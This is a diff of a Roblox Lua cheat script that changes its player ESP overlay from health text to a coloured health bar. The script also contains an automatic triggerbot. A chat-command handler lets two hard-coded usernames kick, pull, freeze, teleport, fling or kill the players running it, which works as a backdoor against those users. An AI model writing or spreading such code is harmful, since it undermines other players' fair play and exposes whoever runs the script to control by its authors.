@@ -1,5 +1,6 @@
--- Full fixed script: VIP commands + Triggerbot + BOX ESP + Partial Name Match
--- Names above box adjusted for clarity; box & name won’t overlap anymore
+-- Full fixed script: VIP commands + Triggerbot + BOX ESP (DisplayName + Health Bar (@username))
+-- Names above box & health bar outside box for clarity
+-- Health bar color changes based on health (green → yellow → red)
 
 -- Services & basics
 local Players = game:GetService("Players")
@@ -13,7 +14,7 @@ local Camera = workspace.CurrentCamera
 local VIPUsers = { "draconvm", "Sypmorph" }
 local BringTargets = {}
 local FrozenPlayers = {}
-local targetedPlayers = {} -- maps PlayerName -> true
+local targetedPlayers = {}
 local espObjects = {} -- maps Player -> {mode='drawing'|'gui', data=...}
 local lastTargetedPlayerName = nil
 
@@ -92,27 +93,30 @@ local function createBoxDrawings()
     local okBox, box = pcall(Drawing.new, "Square")
     local okOut, outline = pcall(Drawing.new, "Square")
     local okTxt, txt = pcall(Drawing.new, "Text")
-    local okHp, hp = pcall(Drawing.new, "Text")
-    if not okBox or not okOut or not okTxt or not okHp then
+    local okHealth, health = pcall(Drawing.new, "Square")
+    if not okBox or not okOut or not okTxt or not okHealth then
         if box then pcall(function() box:Remove() end) end
         if outline then pcall(function() outline:Remove() end) end
         if txt then pcall(function() txt:Remove() end) end
-        if hp then pcall(function() hp:Remove() end) end
+        if health then pcall(function() health:Remove() end) end
         return nil
     end
 
+    -- Box
     box.Thickness = 1
     box.Filled = false
     box.Color = Color3.fromRGB(255,0,0)
     box.Visible = false
     box.ZIndex = 2
 
+    -- Outline
     outline.Thickness = 3
     outline.Filled = false
     outline.Color = Color3.new(0,0,0)
     outline.Visible = false
     outline.ZIndex = 1
 
+    -- Name text
     txt.Size = 13
     txt.Color = Color3.fromRGB(255,255,255)
     txt.Center = true
@@ -121,15 +125,14 @@ local function createBoxDrawings()
     txt.ZIndex = 3
     txt.Text = ""
 
-    hp.Size = 12
-    hp.Color = Color3.fromRGB(0,255,0)
-    hp.Center = true
-    hp.Outline = true
-    hp.Visible = false
-    hp.ZIndex = 3
-    hp.Text = ""
+    -- Health bar (outside the box)
+    health.Thickness = 4
+    health.Filled = true
+    health.Color = Color3.fromRGB(0,255,0)
+    health.Visible = false
+    health.ZIndex = 4
 
-    return {Box=box, Outline=outline, Text=txt, Health=hp}
+    return {Box = box, Outline = outline, Text = txt, Health = health}
 end
 
 local function createBillboardGui()
@@ -152,21 +155,10 @@ local function createBillboardGui()
     label.Font = Enum.Font.SourceSansBold
     label.Text = ""
 
-    local healthLabel = Instance.new("TextLabel", gui)
-    healthLabel.Size = UDim2.new(1,0,1,0)
-    healthLabel.BackgroundTransparency = 1
-    healthLabel.TextColor3 = Color3.fromRGB(0,255,0)
-    healthLabel.TextStrokeTransparency = 0.8
-    healthLabel.TextStrokeColor3 = Color3.new(0,0,0)
-    healthLabel.TextScaled = false
-    healthLabel.TextSize = 12
-    healthLabel.Font = Enum.Font.SourceSansBold
-    healthLabel.Text = ""
-
-    return {Gui=gui, Label=label, HealthLabel=healthLabel, Conn=nil}
+    return {Gui = gui, Label = label, Conn = nil}
 end
 
--- addESP / removeESP
+-- addESP / removeESP (Drawing preferred, GUI fallback)
 local function addESP(targetPlayer)
     if not targetPlayer then return end
     if espObjects[targetPlayer] then return end
@@ -174,23 +166,22 @@ local function addESP(targetPlayer)
     if DrawingAvailable then
         local drawings = createBoxDrawings()
         if drawings then
-            espObjects[targetPlayer] = {mode="drawing", data=drawings}
+            espObjects[targetPlayer] = {mode = "drawing", data = drawings}
             return
         end
     end
 
+    -- fallback to BillboardGui
     local guiData = createBillboardGui()
     guiData.Conn = RunService.RenderStepped:Connect(function()
         if not targetPlayer or not targetPlayer.Character then return end
         local head = targetPlayer.Character:FindFirstChild("Head")
         if head and guiData and guiData.Gui then
             guiData.Gui.Adornee = head
-            guiData.Label.Text = (targetPlayer.DisplayName or targetPlayer.Name) .. " (@"..targetPlayer.Name..")"
-            local hum = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
-            guiData.HealthLabel.Text = hum and math.floor(hum.Health).." HP" or ""
+            guiData.Label.Text = (targetPlayer.DisplayName or targetPlayer.Name) .. " (@" .. targetPlayer.Name .. ")"
         end
     end)
-    espObjects[targetPlayer] = {mode="gui", data=guiData}
+    espObjects[targetPlayer] = {mode = "gui", data = guiData}
 end
 
 local function removeESP(targetPlayer)
@@ -219,37 +210,59 @@ if DrawingAvailable then
             if obj and obj.mode == "drawing" then
                 local d = obj.data
                 if not player or not player.Character then
-                    d.Box.Visible=false; d.Outline.Visible=false; d.Text.Visible=false; d.Health.Visible=false
+                    d.Box.Visible = false
+                    d.Outline.Visible = false
+                    d.Text.Visible = false
+                    d.Health.Visible = false
                 else
                     local root = player.Character:FindFirstChild("HumanoidRootPart") or player.Character:FindFirstChild("Head") or player.Character.PrimaryPart
                     local hum = player.Character:FindFirstChildOfClass("Humanoid")
-                    if not root then
-                        d.Box.Visible=false; d.Outline.Visible=false; d.Text.Visible=false; d.Health.Visible=false
+                    if not root or not hum then
+                        d.Box.Visible = false
+                        d.Outline.Visible = false
+                        d.Text.Visible = false
+                        d.Health.Visible = false
                     else
                         local screenPos, onScreen, depth = wtvp(root.Position)
-                        if onScreen and depth>0 then
-                            local scaleFactor = 1/(depth*math.tan(math.rad(Camera.FieldOfView/2))*2)*1000
-                            local width = math.max(12, math.floor(4*scaleFactor))
-                            local height = math.max(14, math.floor(5*scaleFactor))
+                        if onScreen and depth > 0 then
+                            local scaleFactor = 1 / (depth * math.tan(math.rad(Camera.FieldOfView / 2)) * 2) * 1000
+                            local width = math.max(12, math.floor(4 * scaleFactor))
+                            local height = math.max(14, math.floor(5 * scaleFactor))
 
-                            d.Box.Size = Vector2.new(width,height)
-                            d.Box.Position = Vector2.new(math.floor(screenPos.X-width/2), math.floor(screenPos.Y-height/2))
-                            d.Box.Visible=true
-                            d.Box.Color=(player.TeamColor and player.TeamColor.Color) or Color3.fromRGB(255,0,0)
+                            -- Box & Outline
+                            d.Box.Size = Vector2.new(width, height)
+                            d.Box.Position = Vector2.new(math.floor(screenPos.X - width / 2), math.floor(screenPos.Y - height / 2))
+                            d.Box.Visible = true
+                            d.Box.Color = (player.TeamColor and player.TeamColor.Color) or Color3.fromRGB(255,0,0)
 
-                            d.Outline.Size=d.Box.Size
-                            d.Outline.Position=d.Box.Position
-                            d.Outline.Visible=true
+                            d.Outline.Size = d.Box.Size
+                            d.Outline.Position = d.Box.Position
+                            d.Outline.Visible = true
 
-                            d.Text.Text=(player.DisplayName or player.Name).." (@"..player.Name..")"
-                            d.Text.Position=Vector2.new(math.floor(screenPos.X), math.floor(screenPos.Y-height-10))
-                            d.Text.Visible=true
+                            -- Name text
+                            d.Text.Text = (player.DisplayName or player.Name) .. " (@" .. player.Name .. ")"
+                            d.Text.Position = Vector2.new(math.floor(screenPos.X), math.floor(screenPos.Y - height - 10))
+                            d.Text.Visible = true
 
-                            d.Health.Text=hum and math.floor(hum.Health).." HP" or ""
-                            d.Health.Position=Vector2.new(math.floor(screenPos.X-width/2-40), math.floor(screenPos.Y))
-                            d.Health.Visible=true
+                            -- Health bar outside box
+                            local healthPercent = hum.Health / hum.MaxHealth
+                            local healthWidth = math.max(1, math.floor(width * healthPercent))
+                            d.Health.Size = Vector2.new(healthWidth, 4)
+                            d.Health.Position = Vector2.new(math.floor(screenPos.X - width / 2), math.floor(screenPos.Y + height / 2 + 2))
+                            -- Health color: green → yellow → red
+                            if healthPercent > 0.6 then
+                                d.Health.Color = Color3.fromRGB(0,255,0)
+                            elseif healthPercent > 0.3 then
+                                d.Health.Color = Color3.fromRGB(255,255,0)
+                            else
+                                d.Health.Color = Color3.fromRGB(255,0,0)
+                            end
+                            d.Health.Visible = true
                         else
-                            d.Box.Visible=false; d.Outline.Visible=false; d.Text.Visible=false; d.Health.Visible=false
+                            d.Box.Visible = false
+                            d.Outline.Visible = false
+                            d.Text.Visible = false
+                            d.Health.Visible = false
                         end
                     end
                 end
@@ -260,7 +273,7 @@ end
 
 -- Smooth bring loop
 RunService.RenderStepped:Connect(function()
-    for targetName,_ in pairs(BringTargets) do
+    for targetName, _ in pairs(BringTargets) do
         local targetPlayer = Players:FindFirstChild(targetName)
         for _, vipName in ipairs(VIPUsers) do
             local vipPlayer = Players:FindFirstChild(vipName)
@@ -269,122 +282,139 @@ RunService.RenderStepped:Connect(function()
                 local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                 if vipRoot and targetRoot then
                     local direction = (vipRoot.Position + Vector3.new(0,3,0) - targetRoot.Position)
-                    targetRoot.CFrame = targetRoot.CFrame + direction*0.25
+                    targetRoot.CFrame = targetRoot.CFrame + direction * 0.25
                 end
             end
         end
     end
 end)
 
--- Triggerbot unchanged
-local TriggerBot={Enabled=false,Connections={},BlacklistCache={}}
-TriggerBot.Settings={Keybind=Enum.KeyCode.Q,Blacklisted={"Knife"}}
+-- Triggerbot
+local TriggerBot = {Enabled=false, Connections={}, BlacklistCache={}}
+TriggerBot.Settings = {Keybind = Enum.KeyCode.Q, Blacklisted = {"Knife"}}
 for _, itemName in ipairs(TriggerBot.Settings.Blacklisted) do TriggerBot.BlacklistCache[itemName:lower()] = true end
+
 local function IsToolBlacklisted(tool) return tool and TriggerBot.BlacklistCache[tool.Name:lower()] end
 local function IsValidTarget(player)
-    if not player or player==LocalPlayer then return false end
-    local char=player.Character
+    if not player or player == LocalPlayer then return false end
+    local char = player.Character
     if not char then return false end
-    local be=char:FindFirstChild("BodyEffects")
+    local be = char:FindFirstChild("BodyEffects")
     if be then
-        local ko=be:FindFirstChild("K.O") or be:FindFirstChild("KO")
+        local ko = be:FindFirstChild("K.O") or be:FindFirstChild("KO")
         if ko and ko.Value then return false end
     end
-    local hum=char:FindFirstChild("Humanoid")
-    if hum and hum.Health<=0 then return false end
+    local hum = char:FindFirstChild("Humanoid")
+    if hum and hum.Health <= 0 then return false end
     return true
 end
+
 local function GetTargetFromMouse()
-    local target=Mouse.Target
+    local target = Mouse.Target
     if not target then return nil end
     for _,player in ipairs(Players:GetPlayers()) do
         if player.Character and target:IsDescendantOf(player.Character) and IsValidTarget(player) then
-            return player,target
+            return player, target
         end
     end
     return nil
 end
+
 local function GetEquippedTool()
-    local char=LocalPlayer.Character
+    local char = LocalPlayer.Character
     if not char then return nil end
-    for _,tool in ipairs(char:GetChildren()) do
+    for _, tool in ipairs(char:GetChildren()) do
         if tool:IsA("Tool") and not IsToolBlacklisted(tool) then return tool end
     end
     return nil
 end
+
 local function Execute()
     if not TriggerBot.Enabled then return end
-    local targetPlayer,_=GetTargetFromMouse()
+    local targetPlayer,_ = GetTargetFromMouse()
     if not targetPlayer then return end
-    local tool=GetEquippedTool()
+    local tool = GetEquippedTool()
     if tool then tool:Activate() end
 end
+
 function TriggerBot:Toggle(state) if state~=nil then self.Enabled=state else self.Enabled=not self.Enabled end end
-TriggerBot.Connections.InputBegan = UserInputService.InputBegan:Connect(function(input,gp)
+TriggerBot.Connections.InputBegan = UserInputService.InputBegan:Connect(function(input, gp)
     if gp then return end
-    if input.UserInputType==Enum.UserInputType.Keyboard and input.KeyCode==TriggerBot.Settings.Keybind then
+    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == TriggerBot.Settings.Keybind then
         TriggerBot:Toggle()
     end
 end)
 TriggerBot.Connections.RenderStepped = RunService.RenderStepped:Connect(Execute)
-getgenv().DisableTriggerBot=function()
-    for _,conn in pairs(TriggerBot.Connections) do pcall(function() if conn and conn.Disconnect then conn:Disconnect() end end) end
-    TriggerBot.Enabled=false
+
+getgenv().DisableTriggerBot = function()
+    for _,conn in pairs(TriggerBot.Connections) do
+        pcall(function() if conn and conn.Disconnect then conn:Disconnect() end end)
+    end
+    TriggerBot.Enabled = false
 end
 
--- Chat commands with partial match support
-local function onMessage(sender,msg)
-    local vip=false
-    for _,v in ipairs(VIPUsers) do if sender:lower()==v:lower() then vip=true break end end
+-- Chat commands (partial name detection)
+local function onMessage(sender, msg)
+    local vip = false
+    for _,v in ipairs(VIPUsers) do if sender:lower() == v:lower() then vip = true break end end
     if not vip then return end
 
-    local args=msg:split(" ")
-    local cmd=args[1] and args[1]:lower() or ""
+    local args = msg:split(" ")
+    local cmd = args[1] and args[1]:lower() or ""
 
-    if cmd==".h" then
-        local targetPartial=args[2]
-        if targetPartial then
-            for _,p in ipairs(Players:GetPlayers()) do
-                if (p.Name:lower():find(targetPartial:lower()) or p.DisplayName:lower():find(targetPartial:lower())) and not targetedPlayers[p.Name] then
-                    targetedPlayers[p.Name]=true
-                    lastTargetedPlayerName=p.Name
+    if cmd == ".h" then
+        local partialName = args[2]
+        if partialName then
+            for _, p in ipairs(Players:GetPlayers()) do
+                if (p.Name:lower():find(partialName:lower()) or p.DisplayName:lower():find(partialName:lower())) and not targetedPlayers[p.Name] then
+                    targetedPlayers[p.Name] = true
+                    lastTargetedPlayerName = p.Name
                     addESP(p)
-                    break -- first match only
+                    break -- only first match
                 end
             end
         end
-    elseif cmd==".j" then
+
+    elseif cmd == ".j" then
         for name,_ in pairs(targetedPlayers) do
-            local target=Players:FindFirstChild(name)
+            local target = Players:FindFirstChild(name)
             if target then removeESP(target) end
-            targetedPlayers[name]=nil
+            targetedPlayers[name] = nil
         end
-        lastTargetedPlayerName=nil
-    elseif cmd==".k" and LocalPlayer.Name:lower()~=sender:lower() then
+        lastTargetedPlayerName = nil
+
+    elseif cmd == ".k" and LocalPlayer.Name:lower() ~= sender:lower() then
         LocalPlayer:Kick("Kicked by VIP")
-    elseif cmd==".g" then
-        if LocalPlayer.Name~=sender then BringTargets[LocalPlayer.Name]=true end
-    elseif cmd==".s" then
-        BringTargets[LocalPlayer.Name]=nil
-    elseif cmd==".f" then
+
+    elseif cmd == ".g" then
+        if LocalPlayer.Name ~= sender then BringTargets[LocalPlayer.Name] = true end
+
+    elseif cmd == ".s" then
+        BringTargets[LocalPlayer.Name] = nil
+
+    elseif cmd == ".f" then
         freezeAllPlayers(sender)
-    elseif cmd==".u" then
+
+    elseif cmd == ".u" then
         unfreezeAllPlayers(sender)
-    elseif cmd==".tp" and args[2] then
-        if LocalPlayer.Name~=sender then teleportToPlayer(args[2]) end
-    elseif cmd==".fling" then
-        for _,p in ipairs(Players:GetPlayers()) do if p.Name~=sender then flingPlayer(p) end end
-    elseif cmd==".r" then
-        if LocalPlayer.Name~=sender then killAllOtherPlayers(sender) end
+
+    elseif cmd == ".tp" and args[2] then
+        if LocalPlayer.Name ~= sender then teleportToPlayer(args[2]) end
+
+    elseif cmd == ".fling" then
+        for _,p in ipairs(Players:GetPlayers()) do if p.Name ~= sender then flingPlayer(p) end end
+
+    elseif cmd == ".r" then
+        if LocalPlayer.Name ~= sender then killAllOtherPlayers(sender) end
     end
 end
 
 local function hookPlayer(plr)
-    plr.Chatted:Connect(function(msg) onMessage(plr.Name,msg) end)
+    plr.Chatted:Connect(function(msg) onMessage(plr.Name, msg) end)
 end
 for _,p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
 Players.PlayerAdded:Connect(hookPlayer)
 Players.PlayerRemoving:Connect(function(plr)
-    if targetedPlayers[plr.Name] then targetedPlayers[plr.Name]=nil end
+    if targetedPlayers[plr.Name] then targetedPlayers[plr.Name] = nil end
     removeESP(plr)
 end)
